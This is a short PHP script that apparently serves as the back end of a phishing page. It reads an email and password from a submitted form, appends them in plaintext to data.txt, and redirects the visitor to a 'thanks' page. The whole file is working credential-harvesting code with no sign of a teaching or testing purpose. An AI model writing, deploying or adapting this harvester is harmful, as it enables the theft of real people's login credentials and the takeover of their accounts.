<?php

    if(isset($_POST['email']) AND $_POST['password']){    
        $fp = fopen('data.txt', 'a+');    
        $write = fwrite($fp, $_POST['email'].":".$_POST['password']."\n");    
        fclose($fp);
    }
        //sleep(5);
        
        header("Location: thanks.html"); 

